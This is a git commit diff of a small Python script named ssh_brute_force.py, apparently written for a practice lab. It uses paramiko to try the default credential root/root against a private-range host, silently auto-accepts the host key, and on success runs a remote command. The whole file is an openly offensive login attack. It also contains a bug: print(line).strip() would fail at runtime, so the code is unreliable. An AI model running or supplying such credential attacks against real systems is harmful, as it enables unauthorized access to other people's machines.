7f712c973b3b0e3d4fabf7a1e1f99a19a7880f14
Messias <110695778+Rhuan-Messias@users.noreply.github.com>
2024-04-05 15:35:37 -0300

    Update ssh_brute_force.py

--- ssh_brute_force.py
+++ ssh_brute_force.py
@@ -1,9 +1,20 @@
 #!/usr/bin/python
 #pip install paramiko
+#ssh root@172.16.1.5 --> add the host to known_hosts file with the kali function
 import paramiko
 ssh = paramiko.SSHClient()
-ssh.connect("172.16.1.5", username='root', password='root')
+ssh.load_system_host_keys()
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Auto Add the key to the known_hosts file
 
-stdin, stdout, stderr = ssh.exec_command('id') #here you can type the commands you want to execute
-print(stdout)
+try:
+  ssh.connect("172.16.1.5", username='root', password='root')
+except paramiko.ssh_exception.AuthenticationException:
+  print("Access failed")
+else:
+  print("Connected")
+  stdin, stdout, stderr = ssh.exec_command('ls') #here you can type the commands you want to execute, this will bring the stdout in list format
+  for line in stdout.readlines():
+    print(line).strip() # strip() will remove the line breaks
+
+
 ssh.close()
